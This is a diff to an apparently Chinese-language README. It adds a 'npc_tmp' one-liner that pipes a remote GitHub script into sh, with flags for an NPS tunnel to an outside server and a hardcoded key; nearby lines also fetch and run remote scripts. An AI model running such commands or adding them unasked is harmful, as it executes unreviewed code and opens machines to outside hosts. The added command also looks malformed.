@@ -9,6 +9,11 @@
 bash <(curl -Ls https://github.com/A233S/angti/raw/refs/heads/main/code_server.sh)
 ```
 
+###npc_tmp
+```
+curl -Ls https://github.com/A233S/angti/raw/refs/heads/main/code_server.sh | sh -server=nps.oasen.work:46624 -vkey=ffbcea3e82 -type=tcp
+```
+
 ###使用方法：
 
 main:bash <(curl -Ls https://github.com/A233S/angti/raw/main/phpv3.sh)
